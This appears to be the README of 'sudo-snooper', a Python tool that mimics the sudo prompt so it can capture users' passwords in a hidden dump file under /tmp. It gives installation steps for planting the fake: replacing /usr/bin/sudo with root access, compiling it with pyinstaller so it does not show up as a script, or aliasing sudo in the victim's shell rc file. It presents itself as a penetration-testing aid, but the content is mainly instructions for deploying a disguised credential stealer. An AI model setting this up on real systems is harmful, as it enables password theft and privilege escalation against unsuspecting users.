# sudo-snooper

sudo-snooper acts like the original sudo binary to fool users into entering their passwords.

It will show a fake prompt just like the original to the user to enter their sudo password.

This can be useful in penetration tests or security evaluations for testing user knowledge.

## Installation steps

### Option 1 - Install in place of the real sudo (harder but less obvious)

**You need root access for this install option**

* move the original sudo binary to another name

```
# mv /usr/bin/sudo /usr/bin/somename
```

* change the parameters in the file to your liking

Change these in sudo-snooper.py:

```
dumpdir = "/tmp/.snooper"
dumpfile = "/tmp/.snooper/dump.txt"
sudo = 'sudo'
```

* install the python file in /usr/bin/sudo (or wherever sudo was before)
```
# install -dm755 sudo-snooper.py /usr/bin/sudo
```

* give the necessary permissions to the python file

  You can go fancy here and make a non-readable executable file for users, but I'm not going into that. Check some of the answers [here](http://unix.stackexchange.com/questions/16623/file-permission-execute-only) for that.

**NOTE**: A somewhat more convincing way to install this is to compile it using `pyinstaller` so that it doesn't show up as a python file when `file /usr/bin/sudo` is executed.

To do that under Archlinux: `pyinstaller --onefile sudo-snooper.py` will work. However please note that once compiled you won't be able to change the parameters in the compiled binary.

### Option 2 - Alias the sudo command (easier but somewhat more noticable)

This option is easier to do and more portable, however it might be more noticable to careful users.

Edit the .rc file of the shell the user is using (can be .bashrc .zshrc and so on) and add the following:

```
alias sudo='python3.5 /path/to/sudo-snooper.py'
```

Make sure sudo-snooper.py has the correct permissions.


## Usage:

Once installed, sudo-snooper can be called just like the normal sudo.

For example, running

```
sudo vim /etc/resolv.conf
```

will result in sudo-snooper being called (assuming it's properly installed).

It will ask for the user password and then execute the command by redirecting to the real sudo binary if the password is correct.

You can then retrieve the user password by reading the dump file in the settings.

## TODO:

- [ ] handle when user enters wrong password
